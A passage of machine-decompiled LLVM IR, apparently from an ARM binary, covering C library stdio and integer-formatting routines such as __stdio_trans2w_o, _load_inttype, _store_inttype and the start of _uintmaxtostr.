  %v2_ef0c = inttoptr i32 %v1_ef0c to i32*
  %v3_ef0c = load i32, i32* %v2_ef0c, align 4
  %v1_ef10 = load i32, i32* @r4, align 4
  %v2_ef10 = add i32 %v1_ef10, %v3_ef0c
  store i32 %v2_ef10, i32* %v2_ef0c, align 4
  br label %dec_label_pc_eff0

dec_label_pc_ef1c:                                ; preds = %dec_label_pc_eee0
  %tmp = icmp ult i32 %v2_eef4, %arg2
  br i1 %tmp, label %dec_label_pc_efbc, label %dec_label_pc_ef28

dec_label_pc_ef28:                                ; preds = %dec_label_pc_ef1c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_ef30 = call i32 @memcpy()
  %v0_ef34 = load i32, i32* @r5, align 4
  %v1_ef34 = add i32 %v0_ef34, 16
  %v2_ef34 = inttoptr i32 %v1_ef34 to i32*
  %v3_ef34 = load i32, i32* %v2_ef34, align 4
  %v1_ef38 = add i32 %v0_ef34, 1
  %v2_ef38 = inttoptr i32 %v1_ef38 to i8*
  %v3_ef38 = load i8, i8* %v2_ef38, align 1
  %v1_ef3c = load i32, i32* @r6, align 4
  %v2_ef3c = add i32 %v1_ef3c, %v3_ef34
  %tmp17 = urem i8 %v3_ef38, 2
  %v2_ef40 = icmp eq i8 %tmp17, 0
  store i32 %v2_ef3c, i32* %v2_ef34, align 4
  br i1 %v2_ef40, label %dec_label_pc_eff0, label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef28
  %v0_ef4c = load i32, i32* %r7.global-to-local, align 4
  %v0_ef54 = load i32, i32* @r6, align 4
  %v4_ef58 = call i32 @memrchr(i32 %v0_ef4c, i32 10, i32 %v0_ef54, i32 %v2_ef3c)
  %v2_ef5c = icmp eq i32 %v4_ef58, 0
  br i1 %v2_ef5c, label %dec_label_pc_eff0, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef4c
  %v0_ef64 = load i32, i32* @r5, align 4
  store i32 %v0_ef64, i32* @r0, align 4
  %v0_ef68 = call i32 @__stdio_wcommit()
  %v2_ef6c = icmp eq i32 %v0_ef68, 0
  br i1 %v2_ef6c, label %dec_label_pc_eff0, label %dec_label_pc_ef74

dec_label_pc_ef74:                                ; preds = %dec_label_pc_ef64
  %v0_ef74 = load i32, i32* @r6, align 4
  %v3_ef74 = icmp uge i32 %v0_ef74, %v0_ef68
  %v0_ef68.v0_ef74 = select i1 %v3_ef74, i32 %v0_ef68, i32 %v0_ef74
  store i32 %v0_ef68.v0_ef74, i32* @r4, align 4
  %v2_ef80 = sub i32 %v0_ef74, %v0_ef68.v0_ef74
  %v0_ef84 = load i32, i32* %r7.global-to-local, align 4
  %v2_ef84 = add i32 %v0_ef84, %v2_ef80
  store i32 %v2_ef84, i32* %r7.global-to-local, align 4
  store i32 %v0_ef68.v0_ef74, i32* @r2, align 4
  %v4_ef94 = call i32 @__GI_memchr(i32 %v2_ef84, i32 10, i32 %v0_ef68.v0_ef74, i32 %v2_ef80)
  %v2_ef98 = icmp eq i32 %v4_ef94, 0
  br i1 %v2_ef98, label %dec_label_pc_eff0, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef74
  %v0_efa0 = load i32, i32* @r5, align 4
  %v1_efa0 = add i32 %v0_efa0, 16
  %v2_efa0 = inttoptr i32 %v1_efa0 to i32*
  %v3_efa0 = load i32, i32* %v2_efa0, align 4
  %v0_efa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_efa4 = load i32, i32* @r4, align 4
  %v2_efa4 = sub i32 %v0_efa4, %v4_ef94
  %v2_efa8 = add i32 %v2_efa4, %v1_efa4
  %v2_efac = sub i32 %v3_efa0, %v2_efa8
  %v1_efb0 = load i32, i32* @r6, align 4
  %v2_efb0 = sub i32 %v1_efb0, %v2_efa8
  store i32 %v2_efb0, i32* @r6, align 4
  store i32 %v2_efac, i32* %v2_efa0, align 4
  br label %dec_label_pc_eff0

dec_label_pc_efbc:                                ; preds = %dec_label_pc_ef1c
  %v1_efbc = add i32 %arg3, 8
  %v2_efbc = inttoptr i32 %v1_efbc to i32*
  %v3_efbc = load i32, i32* %v2_efbc, align 4
  %v9_efc0 = icmp eq i32 %v3_eee8, %v3_efbc
  br i1 %v9_efc0, label %dec_label_pc_efdc, label %dec_label_pc_efc8

dec_label_pc_efc8:                                ; preds = %dec_label_pc_efbc
  store i32 %arg3, i32* @r0, align 4
  %v0_efcc = call i32 @__stdio_wcommit()
  %v2_efd0 = icmp eq i32 %v0_efcc, 0
  br i1 %v2_efd0, label %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge, label %bb13

dec_label_pc_efc8.dec_label_pc_efdc_crit_edge:    ; preds = %dec_label_pc_efc8
  %v0_efe4.pre = load i32, i32* @r6, align 4
  %v0_efdc.pre = load i32, i32* @r5, align 4
  %v0_efe0.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_efe8.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_efdc

bb13:                                             ; preds = %dec_label_pc_efc8
  %v1_efd4 = load i32, i32* @r4, align 4
  store i32 %v1_efd4, i32* @r6, align 4
  br label %dec_label_pc_eff0

dec_label_pc_efdc:                                ; preds = %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge, %entry, %dec_label_pc_efbc
  %v2_efe8 = phi i32 [ %v2_efe8.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %v3_eec0, %entry ], [ %v3_eec0, %dec_label_pc_efbc ]
  %v0_efe0 = phi i32 [ %v0_efe0.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_efbc ]
  %v0_efdc = phi i32 [ %v0_efdc.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_efbc ]
  %v0_efe4 = phi i32 [ %v0_efe4.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_efbc ]
  store i32 %v2_efe8, i32* @r4, align 4
  store i32 %v9_eec0, i32* @r6, align 4
  store i32 %v15_eec0, i32* @lr, align 4
  %v3_efec = inttoptr i32 %v0_efdc to i8*
  %v4_efec = call i32 @__stdio_WRITE(i8* %v3_efec, i32 %v0_efe0, i32 %v0_efe4)
  br label %dec_label_pc_eff0

dec_label_pc_eff0:                                ; preds = %bb13, %dec_label_pc_ef74, %dec_label_pc_ef64, %dec_label_pc_ef4c, %dec_label_pc_ef28, %dec_label_pc_efa0, %bb10, %dec_label_pc_efdc
  %v0_eff0 = load i32, i32* @r6, align 4
  %v2_eff4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_eff4, i32* @r4, align 4
  store i32 %v6_eec0, i32* @r5, align 4
  store i32 %v9_eec0, i32* @r6, align 4
  store i32 %v12_eec0, i32* @r7, align 4
  ret i32 %v0_eff0

; uselistorder directives
  uselistorder i32 %v2_efa8, { 1, 0 }
  uselistorder i32 %v2_ef80, { 1, 0 }
  uselistorder i32 %v0_ef68.v0_ef74, { 1, 2, 0, 3 }
  uselistorder i32 %v0_ef74, { 1, 0, 2 }
  uselistorder i32 %v2_eef4, { 2, 0, 1, 3 }
  uselistorder i32 %v9_eec0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 2, 5, 7, 6, 4, 3, 8 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_eff0, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_efdc, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eff8 = load i32, i32* @r4, align 4
  store i32 %v3_eff8, i32* %stack_var_-8, align 4
  %v3_effc = load i8, i8* %arg1, align 1
  %v4_effc = zext i8 %v3_effc to i32
  store i32 %v4_effc, i32* %r2.global-to-local, align 4
  %v2_f000 = add i32 %tmp, 1
  %v3_f000 = inttoptr i32 %v2_f000 to i8*
  %v4_f000 = load i8, i8* %v3_f000, align 1
  %v5_f000 = zext i8 %v4_f000 to i32
  store i32 %v5_f000, i32* %r3.global-to-local, align 4
  %v4_f004 = mul nuw nsw i32 %v5_f000, 256
  %v5_f004 = or i32 %v4_f004, %v4_effc
  store i32 %v5_f004, i32* %r2.global-to-local, align 4
  %v2_f008 = and i32 %v5_f004, %arg2
  %v4_f008 = icmp eq i32 %v2_f008, 0
  store i1 %v4_f008, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_f008, label %dec_label_pc_f014, label %dec_label_pc_f02c

dec_label_pc_f014:                                ; preds = %entry
  %v1_f014 = and i32 %v5_f004, 2176
  %v2_f014 = icmp eq i32 %v1_f014, 0
  store i1 %v2_f014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f014, label %dec_label_pc_f01c, label %dec_label_pc_f040

dec_label_pc_f01c:                                ; preds = %dec_label_pc_f014
  %v2_f01c = or i32 %v5_f004, %arg2
  store i32 %v2_f01c, i32* %r2.global-to-local, align 4
  %v3_f020 = sdiv i32 %v2_f01c, 256
  store i32 %v3_f020, i32* %r3.global-to-local, align 4
  %v1_f024 = trunc i32 %v3_f020 to i8
  store i8 %v1_f024, i8* %v3_f000, align 1
  %v0_f028 = load i32, i32* %r2.global-to-local, align 4
  %v1_f028 = trunc i32 %v0_f028 to i8
  store i8 %v1_f028, i8* %arg1, align 1
  %v0_f02c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f02c

dec_label_pc_f02c:                                ; preds = %entry, %dec_label_pc_f01c
  %v0_f078 = phi i32 [ %tmp, %entry ], [ %v0_f02c.pre, %dec_label_pc_f01c ]
  %v1_f02c = inttoptr i32 %v0_f078 to i8*
  %v2_f02c = load i8, i8* %v1_f02c, align 1
  %v3_f02c = zext i8 %v2_f02c to i32
  store i32 %v3_f02c, i32* %r2.global-to-local, align 4
  %v1_f030 = add i32 %v0_f078, 1
  %v2_f030 = inttoptr i32 %v1_f030 to i8*
  %v3_f030 = load i8, i8* %v2_f030, align 1
  %v4_f030 = zext i8 %v3_f030 to i32
  store i32 %v4_f030, i32* %r3.global-to-local, align 4
  %v4_f034 = mul nuw nsw i32 %v4_f030, 256
  %v5_f034 = or i32 %v4_f034, %v3_f02c
  store i32 %v5_f034, i32* @ip, align 4
  %v1_f038 = and i32 %v3_f02c, 32
  %v2_f038 = icmp eq i32 %v1_f038, 0
  store i1 %v2_f038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f038, label %dec_label_pc_f068, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %dec_label_pc_f014, %dec_label_pc_f02c
  %v0_f040 = call i32 @__errno_location()
  store i32 %v0_f040, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_f048 = inttoptr i32 %v0_f040 to i32*
  store i32 9, i32* %v2_f048, align 4
  br label %dec_label_pc_f04c

dec_label_pc_f04c:                                ; preds = %dec_label_pc_f090, %dec_label_pc_f040
  %v0_f04c = load i32, i32* @r4, align 4
  %v1_f04c = inttoptr i32 %v0_f04c to i32*
  %v2_f04c = load i32, i32* %v1_f04c, align 4
  %v1_f050 = or i32 %v2_f04c, 8
  store i32 %v1_f050, i32* %r3.global-to-local, align 4
  %v3_f054 = sdiv i32 %v2_f04c, 256
  store i32 %v3_f054, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_f05c = trunc i32 %v3_f054 to i8
  %v3_f05c = add i32 %v0_f04c, 1
  %v4_f05c = inttoptr i32 %v3_f05c to i8*
  store i8 %v1_f05c, i8* %v4_f05c, align 1
  %v0_f060 = load i32, i32* %r3.global-to-local, align 4
  %v1_f060 = trunc i32 %v0_f060 to i8
  %v2_f060 = load i32, i32* @r4, align 4
  %v3_f060 = inttoptr i32 %v2_f060 to i8*
  store i8 %v1_f060, i8* %v3_f060, align 1
  %v2_f064 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f064, i32* @r4, align 4
  ret i32 -1

dec_label_pc_f068:                                ; preds = %dec_label_pc_f02c
  %tmp15 = urem i8 %v2_f02c, 4
  %v2_f068 = icmp eq i8 %tmp15, 0
  store i1 %v2_f068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f068, label %dec_label_pc_f0cc, label %dec_label_pc_f070

dec_label_pc_f070:                                ; preds = %dec_label_pc_f068
  %v1_f070 = and i32 %v3_f02c, 4
  store i32 %v1_f070, i32* @r1, align 4
  %v2_f070 = icmp eq i32 %v1_f070, 0
  store i1 %v2_f070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f070, label %dec_label_pc_f078, label %dec_label_pc_f0a8

dec_label_pc_f078:                                ; preds = %dec_label_pc_f070
  %v1_f078 = add i32 %v0_f078, 20
  %v2_f078 = inttoptr i32 %v1_f078 to i32*
  %v3_f078 = load i32, i32* %v2_f078, align 4
  store i32 %v3_f078, i32* %r2.global-to-local, align 4
  %v1_f07c = add i32 %v0_f078, 16
  %v2_f07c = inttoptr i32 %v1_f07c to i32*
  %v3_f07c = load i32, i32* %v2_f07c, align 4
  store i32 %v3_f07c, i32* %r3.global-to-local, align 4
  %v9_f080 = icmp eq i32 %v3_f078, %v3_f07c
  store i1 %v9_f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f080, label %dec_label_pc_f088, label %dec_label_pc_f090

dec_label_pc_f088:                                ; preds = %dec_label_pc_f078
  %v1_f088 = and i32 %v3_f02c, 2
  %v2_f088 = icmp eq i32 %v1_f088, 0
  store i1 %v2_f088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f088, label %dec_label_pc_f0a8, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %dec_label_pc_f078, %dec_label_pc_f088
  %v1_f090 = and i32 %v4_f034, 1024
  %v2_f090 = icmp eq i32 %v1_f090, 0
  store i1 %v2_f090, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_f090, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_f09c = call i32 @__GI_fseek()
  store i32 %v0_f09c, i32* %r0.global-to-local, align 4
  %v2_f0a0 = icmp eq i32 %v0_f09c, 0
  store i1 %v2_f0a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0a0, label %.dec_label_pc_f0a8_crit_edge, label %dec_label_pc_f04c

.dec_label_pc_f0a8_crit_edge:                     ; preds = %dec_label_pc_f090
  %v0_f0a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %.dec_label_pc_f0a8_crit_edge, %dec_label_pc_f070, %dec_label_pc_f088
  %v2_f0b8 = phi i32 [ %v0_f0a8.pre, %.dec_label_pc_f0a8_crit_edge ], [ %v0_f078, %dec_label_pc_f070 ], [ %v0_f078, %dec_label_pc_f088 ]
  %v1_f0a8 = inttoptr i32 %v2_f0b8 to i32*
  %v2_f0a8 = load i32, i32* %v1_f0a8, align 4
  store i32 %v2_f0a8, i32* %r3.global-to-local, align 4
  %v1_f0ac = add i32 %v2_f0b8, 8
  %v2_f0ac = inttoptr i32 %v1_f0ac to i32*
  %v3_f0ac = load i32, i32* %v2_f0ac, align 4
  store i32 %v3_f0ac, i32* %r1.global-to-local, align 4
  %v1_f0b0 = and i32 %v2_f0a8, -4
  store i32 %v1_f0b0, i32* %r3.global-to-local, align 4
  %v3_f0b4 = sdiv i32 %v2_f0a8, 256
  store i32 %v3_f0b4, i32* %r2.global-to-local, align 4
  %v1_f0b8 = trunc i32 %v3_f0b4 to i8
  %v3_f0b8 = add i32 %v2_f0b8, 1
  %v4_f0b8 = inttoptr i32 %v3_f0b8 to i8*
  store i8 %v1_f0b8, i8* %v4_f0b8, align 1
  %v0_f0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_f0bc = load i32, i32* @r4, align 4
  %v2_f0bc = add i32 %v1_f0bc, 20
  %v3_f0bc = inttoptr i32 %v2_f0bc to i32*
  store i32 %v0_f0bc, i32* %v3_f0bc, align 4
  %v0_f0c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f0c0 = trunc i32 %v0_f0c0 to i8
  %v2_f0c0 = load i32, i32* @r4, align 4
  %v3_f0c0 = inttoptr i32 %v2_f0c0 to i8*
  store i8 %v1_f0c0, i8* %v3_f0c0, align 1
  %v0_f0c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0c4 = load i32, i32* @r4, align 4
  %v2_f0c4 = add i32 %v1_f0c4, 24
  %v3_f0c4 = inttoptr i32 %v2_f0c4 to i32*
  store i32 %v0_f0c4, i32* %v3_f0c4, align 4
  %v0_f0c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0c8 = load i32, i32* @r4, align 4
  %v2_f0c8 = add i32 %v1_f0c8, 16
  %v3_f0c8 = inttoptr i32 %v2_f0c8 to i32*
  store i32 %v0_f0c8, i32* %v3_f0c8, align 4
  %v0_f0cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f068, %dec_label_pc_f0a8
  %v2_f0d8 = phi i32 [ %v0_f078, %dec_label_pc_f068 ], [ %v0_f0cc.pre, %dec_label_pc_f0a8 ]
  %v1_f0cc = inttoptr i32 %v2_f0d8 to i32*
  %v2_f0cc = load i32, i32* %v1_f0cc, align 4
  %v1_f0d0 = or i32 %v2_f0cc, 64
  store i32 %v1_f0d0, i32* %r2.global-to-local, align 4
  %v3_f0d4 = sdiv i32 %v2_f0cc, 256
  store i32 %v3_f0d4, i32* %r3.global-to-local, align 4
  %v1_f0d8 = trunc i32 %v3_f0d4 to i8
  %v3_f0d8 = add i32 %v2_f0d8, 1
  %v4_f0d8 = inttoptr i32 %v3_f0d8 to i8*
  store i8 %v1_f0d8, i8* %v4_f0d8, align 1
  %v0_f0dc = load i32, i32* @r4, align 4
  %v1_f0dc = add i32 %v0_f0dc, 1
  %v2_f0dc = inttoptr i32 %v1_f0dc to i8*
  %v3_f0dc = load i8, i8* %v2_f0dc, align 1
  %v4_f0dc = zext i8 %v3_f0dc to i32
  %v3_f0e0 = mul nuw nsw i32 %v4_f0dc, 256
  store i32 %v3_f0e0, i32* %r3.global-to-local, align 4
  %v1_f0e4 = and i32 %v3_f0e0, 2816
  store i32 %v1_f0e4, i32* %r0.global-to-local, align 4
  %v2_f0e4 = icmp eq i32 %v1_f0e4, 0
  store i1 %v2_f0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0e4, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_f0cc
  %v2_f0e8 = add i32 %v0_f0dc, 12
  %v3_f0e8 = inttoptr i32 %v2_f0e8 to i32*
  %v4_f0e8 = load i32, i32* %v3_f0e8, align 4
  store i32 %v4_f0e8, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_f0cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_f0f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f0f0 = trunc i32 %v0_f0f0 to i8
  %v3_f0f0 = inttoptr i32 %v0_f0dc to i8*
  store i8 %v1_f0f0, i8* %v3_f0f0, align 1
  %v0_f0f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0f4, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_f0f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f0f4 = load i32, i32* @r4, align 4
  %v3_f0f4 = add i32 %v2_f0f4, 28
  %v4_f0f4 = inttoptr i32 %v3_f0f4 to i32*
  store i32 %v1_f0f4, i32* %v4_f0f4, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_f0f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f0f8, i32* @r4, align 4
  %v8_f0f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_f0f8

; uselistorder directives
  uselistorder i32 %v3_f0e0, { 1, 0 }
  uselistorder i32 %v3_f0d4, { 1, 0 }
  uselistorder i32 %v3_f0b4, { 1, 0 }
  uselistorder i32 %v2_f0b8, { 0, 2, 1 }
  uselistorder i1 %v2_f068, { 1, 0 }
  uselistorder i32 %v3_f054, { 1, 0 }
  uselistorder i32 %v3_f02c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_f078, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_f020, { 1, 0 }
  uselistorder i32 %v5_f004, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 12, 13, 2, 14, 1, 9, 10, 11, 3, 7, 4, 6, 8, 5 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_f0cc, { 1, 0 }
  uselistorder label %dec_label_pc_f0a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f090, { 1, 0 }
  uselistorder label %dec_label_pc_f040, { 1, 0 }
  uselistorder label %dec_label_pc_f02c, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_f0fc = load i32, i32* @r2, align 4
  %v1_f0fc = icmp slt i32 %v0_f0fc, 0
  %v0_f100 = load i32, i32* @r0, align 4
  %v1_f104 = and i32 %v0_f100, 2048
  %v2_f138 = icmp eq i32 %v1_f104, 0
  br i1 %v1_f0fc, label %dec_label_pc_f138, label %dec_label_pc_f10c

dec_label_pc_f10c:                                ; preds = %entry
  br i1 %v2_f138, label %dec_label_pc_f114, label %dec_label_pc_f140

dec_label_pc_f114:                                ; preds = %dec_label_pc_f10c
  %v7_f114 = icmp eq i32 %v0_f100, 256
  %v0_f118 = load i32, i32* @r1, align 4
  %v1_f118 = inttoptr i32 %v0_f118 to i32*
  %v2_f118 = load i32, i32* %v1_f118, align 4
  %v2_f11c = urem i32 %v2_f118, 256
  %v2_f11c.v2_f118 = select i1 %v7_f114, i32 %v2_f11c, i32 %v2_f118
  br i1 %v7_f114, label %.thread, label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f114
  %v7_f124 = icmp eq i32 %v0_f100, 512
  br i1 %v7_f124, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f124
  %v4_f12c = urem i32 %v2_f11c.v2_f118, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f124, %dec_label_pc_f114, %bb
  %v1_f134 = phi i32 [ %v2_f118, %dec_label_pc_f124 ], [ %v2_f11c, %dec_label_pc_f114 ], [ %v4_f12c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_f134

dec_label_pc_f138:                                ; preds = %entry
  br i1 %v2_f138, label %dec_label_pc_f148, label %dec_label_pc_f140

dec_label_pc_f140:                                ; preds = %dec_label_pc_f10c, %dec_label_pc_f138
  %v0_f140 = load i32, i32* @r1, align 4
  %v1_f140 = inttoptr i32 %v0_f140 to i32*
  %v2_f140 = load i32, i32* %v1_f140, align 4
  %v3_f140 = add i32 %v0_f140, 4
  %v4_f140 = inttoptr i32 %v3_f140 to i32*
  %v5_f140 = load i32, i32* %v4_f140, align 4
  store i32 %v5_f140, i32* @r1, align 4
  ret i32 %v2_f140

dec_label_pc_f148:                                ; preds = %dec_label_pc_f138
  %v7_f148 = icmp eq i32 %v0_f100, 256
  %v0_f14c = load i32, i32* @r1, align 4
  %v1_f14c = inttoptr i32 %v0_f14c to i32*
  %v2_f14c = load i32, i32* %v1_f14c, align 4
  %v2_f150 = urem i32 %v2_f14c, 256
  %v2_f150.v2_f14c = select i1 %v7_f148, i32 %v2_f150, i32 %v2_f14c
  br i1 %v7_f148, label %.thread2, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f148
  %v7_f158 = icmp eq i32 %v0_f100, 512
  br i1 %v7_f158, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_f158
  %v4_f15c = mul i32 %v2_f150.v2_f14c, 65536
  %v4_f160 = sdiv i32 %v4_f15c, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f158, %dec_label_pc_f148, %bb5
  %v0_f164 = phi i32 [ %v2_f14c, %dec_label_pc_f158 ], [ %v2_f150, %dec_label_pc_f148 ], [ %v4_f160, %bb5 ]
  %v3_f164 = ashr i32 %v0_f164, 31
  store i32 %v3_f164, i32* @r1, align 4
  ret i32 %v0_f164

; uselistorder directives
  uselistorder i32 %v0_f164, { 1, 0 }
  uselistorder i32 %v2_f150, { 1, 0 }
  uselistorder i32 %v2_f14c, { 1, 2, 0 }
  uselistorder i32 %v2_f11c, { 1, 0 }
  uselistorder i32 %v2_f118, { 1, 2, 0 }
  uselistorder i1 %v2_f138, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f140, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_f16c = icmp eq i32 %arg2, 256
  br i1 %v7_f16c, label %dec_label_pc_f198, label %dec_label_pc_f174

dec_label_pc_f174:                                ; preds = %entry
  %v7_f174 = icmp eq i32 %arg2, 2048
  br i1 %v7_f174, label %dec_label_pc_f17c, label %dec_label_pc_f184

dec_label_pc_f17c:                                ; preds = %dec_label_pc_f174
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_f17c = add i32 %tmp2, 4
  %v6_f17c = inttoptr i32 %v5_f17c to i32*
  store i32 %arg4, i32* %v6_f17c, align 4
  ret i32 %tmp2

dec_label_pc_f184:                                ; preds = %dec_label_pc_f174
  %v7_f184 = icmp eq i32 %arg2, 512
  %v4_f188 = sdiv i32 %arg3, 256
  store i32 %v4_f188, i32* @ip, align 4
  br i1 %v7_f184, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f184
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_f184
  %v1_f194 = trunc i32 %v4_f188 to i8
  %v4_f194 = add i32 %tmp2, 1
  %v5_f194 = inttoptr i32 %v4_f194 to i8*
  store i8 %v1_f194, i8* %v5_f194, align 1
  br label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_f188, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f198, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_f1a4 = icmp slt i32 %arg4, 0
  %v2_f1a4 = icmp eq i32 %arg4, 0
  store i1 %v2_f1a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_f1a4, label %dec_label_pc_f1bc, label %dec_label_pc_f1dc

dec_label_pc_f1bc:                                ; preds = %entry
  %v1_f1bc = icmp slt i32 %arg3, 0
  %v2_f1bc = icmp eq i32 %arg3, 0
  store i1 %v2_f1bc, i1* %cpsr_z.global-to-local, align 1
  %v1_f1c0 = sub i32 0, %arg4
  store i32 %v1_f1c0, i32* %r7.global-to-local, align 4
  br i1 %v1_f1bc, label %dec_label_pc_f1c8, label %dec_label_pc_f1dc

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1bc
  %v1_f1cc = sub i32 0, %arg2
